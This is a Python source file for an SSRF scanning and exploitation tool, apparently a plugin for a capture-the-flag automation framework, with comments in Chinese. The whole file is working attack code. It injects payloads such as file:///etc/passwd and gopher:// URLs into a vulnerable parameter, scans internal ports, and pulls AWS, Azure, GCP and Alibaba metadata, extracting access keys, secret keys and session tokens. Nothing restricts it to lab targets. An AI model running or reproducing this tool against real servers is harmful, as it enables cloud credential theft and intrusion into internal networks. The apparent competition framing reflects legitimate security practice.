#!/usr/bin/env python
"""
SSRF Scanner Tool - SSRF自动化检测与利用
支持：协议探测、内网扫描、云元数据获取、Redis/Mysql等内网服务利用
"""

import re
import json
import time
import requests
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin

from tool_framework import CTFTool, CommandLineTool
from app.flag_extractor_v2 import extract_flags


class SSRFScanner(CTFTool):
    """SSRF自动化扫描与利用工具"""

    def name(self) -> str:
        return "ssrf-scanner"

    def description(self) -> str:
        return "SSRF自动化检测与利用，支持协议探测、内网扫描、云元数据获取"

    def supported_vulns(self) -> List[str]:
        return [
            "SSRF",
            "Server-Side Request Forgery",
            "Internal Network Access",
            "Cloud Metadata",
            "Port Scanning via SSRF"
        ]

    def expected_params(self) -> Dict:
        return {
            "target_url": {
                "type": "string",
                "description": "存在SSRF的目标URL",
                "required": True
            },
            "ssrf_param": {
                "type": "string",
                "description": "SSRF注入参数名",
                "required": True
            },
            "method": {
                "type": "string",
                "description": "HTTP方法 (GET/POST)",
                "required": False,
                "default": "GET"
            },
            "payload_type": {
                "type": "string",
                "description": "攻击类型: probe/cloud/internal/custom",
                "required": False,
                "default": "probe"
            },
            "custom_payload": {
                "type": "string",
                "description": "自定义SSRF Payload",
                "required": False
            },
            "internal_target": {
                "type": "string",
                "description": "内网目标地址 (用于internal模式)",
                "required": False
            },
            "callback_host": {
                "type": "string",
                "description": "外带服务器地址",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        """执行SSRF检测与利用"""
        target_url = params.get("target_url", target)
        ssrf_param = params.get("ssrf_param", "url")
        method = params.get("method", "GET").upper()
        payload_type = params.get("payload_type", "probe")

        results = {
            "tool": self.name(),
            "target": target_url,
            "status": 200,
            "output": "",
            "findings": [],
            "extracted_flag": None
        }

        try:
            if payload_type == "probe":
                findings = self._probe_protocols(target_url, ssrf_param, method)
                results["findings"] = findings
                results["output"] = self._format_findings(findings)

            elif payload_type == "cloud":
                findings = self._scan_cloud_metadata(target_url, ssrf_param, method)
                results["findings"] = findings
                results["output"] = self._format_findings(findings)
                # 检查是否获取到云凭据
                for f in findings:
                    if f.get("type") == "cloud_credentials":
                        results["extracted_flag"] = f.get("data", {}).get("access_key")

            elif payload_type == "internal":
                internal_target = params.get("internal_target", "127.0.0.1")
                findings = self._scan_internal(target_url, ssrf_param, method, internal_target)
                results["findings"] = findings
                results["output"] = self._format_findings(findings)

            elif payload_type == "custom":
                custom_payload = params.get("custom_payload", "http://127.0.0.1")
                output = self._send_ssrf(target_url, ssrf_param, method, custom_payload)
                results["output"] = output
                # 检查Flag
                flags = extract_flags(output)
                if flags:
                    results["extracted_flag"] = flags[0]

            # 综合判断是否存在SSRF
            if results["findings"] or "response" in results["output"].lower():
                results["vuln_confirmed"] = True

        except Exception as e:
            results["status"] = 500
            results["output"] = f"Error: {str(e)}"

        return results

    def _probe_protocols(self, target_url: str, param: str, method: str) -> List[Dict]:
        """探测支持的协议"""
        findings = []

        # 协议测试Payload
        protocol_payloads = {
            "http": "http://127.0.0.1:80",
            "https": "https://127.0.0.1:443",
            "file": "file:///etc/passwd",
            "dict": "dict://127.0.0.1:6379/info",
            "gopher": "gopher://127.0.0.1:70/tcp",
            "ftp": "ftp://127.0.0.1:21",
            "ldap": "ldap://127.0.0.1:389",
            "sftp": "sftp://127.0.0.1:22",
        }

        for proto, payload in protocol_payloads.items():
            try:
                resp = self._send_ssrf(target_url, param, method, payload)
                if resp and len(resp) > 100:
                    findings.append({
                        "type": "protocol_supported",
                        "protocol": proto,
                        "payload": payload,
                        "response_length": len(resp),
                        "indicators": self._find_indicators(resp)
                    })
            except:
                pass

        return findings

    def _scan_cloud_metadata(self, target_url: str, param: str, method: str) -> List[Dict]:
        """扫描云元数据服务"""
        findings = []

        # 云元数据端点
        cloud_endpoints = {
            "AWS": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
            ],
            "Azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ],
            "GCP": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            ],
            "Alibaba": [
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            ]
        }

        for provider, endpoints in cloud_endpoints.items():
            for endpoint in endpoints:
                try:
                    headers = {}
                    if provider == "GCP":
                        headers["Metadata-Flavor"] = "Google"
                    elif provider == "Azure":
                        headers["Metadata"] = "true"

                    resp = self._send_ssrf(target_url, param, method, endpoint, extra_headers=headers)
                    if resp and ("instance" in resp.lower() or "ami" in resp.lower() or
                                 "project" in resp.lower() or "access" in resp.lower()):
                        finding = {
                            "type": "cloud_metadata",
                            "provider": provider,
                            "endpoint": endpoint,
                            "data": self._parse_cloud_response(provider, resp)
                        }
                        findings.append(finding)

                        # 检查是否是凭据
                        if "AccessKeyId" in resp or "SecretAccessKey" in resp or "Token" in resp:
                            findings.append({
                                "type": "cloud_credentials",
                                "provider": provider,
                                "data": self._extract_cloud_creds(provider, resp)
                            })
                except:
                    pass

        return findings

    def _scan_internal(self, target_url: str, param: str, method: str,
                       internal_target: str) -> List[Dict]:
        """扫描内网服务"""
        findings = []

        # 常见内网端口
        common_ports = [22, 80, 443, 3306, 6379, 27017, 8080, 8443, 9000]

        for port in common_ports:
            payload = f"http://{internal_target}:{port}"
            try:
                resp = self._send_ssrf(target_url, param, method, payload, timeout=3)
                if resp and len(resp) > 50:
                    findings.append({
                        "type": "internal_service",
                        "target": f"{internal_target}:{port}",
                        "response_length": len(resp),
                        "service": self._identify_service(resp, port)
                    })
            except:
                pass

        return findings

    def _send_ssrf(self, target_url: str, param: str, method: str,
                   payload: str, timeout: int = 10,
                   extra_headers: Dict = None) -> Optional[str]:
        """发送SSRF请求"""
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            if extra_headers:
                headers.update(extra_headers)

            if method == "GET":
                # 构造带payload的URL
                parsed = urlparse(target_url)
                params = dict(re.findall(r'([^&]+)=([^&]*)', parsed.query))
                params[param] = payload
                new_query = "&".join(f"{k}={v}" for k, v in params.items())
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                resp = requests.get(new_url, headers=headers, timeout=timeout, verify=False)
            else:
                data = {param: payload}
                resp = requests.post(target_url, data=data, headers=headers,
                                     timeout=timeout, verify=False)

            return resp.text[:5000]
        except Exception as e:
            return None

    def _find_indicators(self, response: str) -> List[str]:
        """查找响应中的敏感指标"""
        indicators = []
        patterns = [
            (r"root:[x*]:0:0:", "passwd file content"),
            (r"redis_version", "Redis info"),
            (r"Server:", "HTTP server header"),
            (r"SSH-", "SSH banner"),
            (r"MySQL", "MySQL response"),
            (r"MongoDB", "MongoDB response"),
        ]

        for pattern, name in patterns:
            if re.search(pattern, response, re.IGNORECASE):
                indicators.append(name)

        return indicators

    def _parse_cloud_response(self, provider: str, response: str) -> Dict:
        """解析云元数据响应"""
        data = {}
        try:
            if provider == "AWS":
                # AWS元数据通常是纯文本
                lines = response.strip().split('\n')
                for line in lines[:20]:
                    if '=' in line or ':' in line:
                        data[line.split('=')[0].split(':')[0]] = line
            else:
                # 尝试JSON解析
                data = json.loads(response)
        except:
            data = {"raw": response[:500]}

        return data

    def _extract_cloud_creds(self, provider: str, response: str) -> Dict:
        """提取云凭据"""
        creds = {}

        if provider == "AWS":
            access_key = re.search(r'AccessKeyId[=:]\s*([A-Z0-9]+)', response)
            secret_key = re.search(r'SecretAccessKey[=:]\s*([A-Za-z0-9/+=]+)', response)
            token = re.search(r'Token[=:]\s*([A-Za-z0-9/+=]+)', response)

            if access_key:
                creds["AccessKeyId"] = access_key.group(1)
            if secret_key:
                creds["SecretAccessKey"] = secret_key.group(1)
            if token:
                creds["SessionToken"] = token.group(1)

        return creds

    def _identify_service(self, response: str, port: int) -> str:
        """识别服务类型"""
        response_lower = response.lower()

        if "ssh" in response_lower or "openssh" in response_lower:
            return "SSH"
        elif "mysql" in response_lower:
            return "MySQL"
        elif "redis" in response_lower or "redis_version" in response_lower:
            return "Redis"
        elif "mongodb" in response_lower:
            return "MongoDB"
        elif "<html" in response_lower or "<!doctype" in response_lower:
            return "HTTP"
        elif "nginx" in response_lower or "apache" in response_lower:
            return "HTTP"
        else:
            return "Unknown"

    def _format_findings(self, findings: List[Dict]) -> str:
        """格式化发现结果"""
        if not findings:
            return "No SSRF findings"

        output = f"SSRF Scan Results ({len(findings)} findings):\n\n"
        for i, f in enumerate(findings, 1):
            output += f"[{i}] Type: {f.get('type', 'unknown')}\n"
            if f.get("protocol"):
                output += f"    Protocol: {f['protocol']}\n"
            if f.get("provider"):
                output += f"    Provider: {f['provider']}\n"
            if f.get("endpoint"):
                output += f"    Endpoint: {f['endpoint']}\n"
            if f.get("target"):
                output += f"    Target: {f['target']}\n"
            if f.get("data"):
                output += f"    Data: {str(f['data'])[:200]}\n"
            output += "\n"

        return output

    def check_available(self) -> bool:
        """检查工具是否可用"""
        return True  # 纯Python实现，始终可用


# 注册工具
def register():
    """注册工具到ToolRegistry"""
    from tool_framework import ToolRegistry
    ToolRegistry.register(SSRFScanner())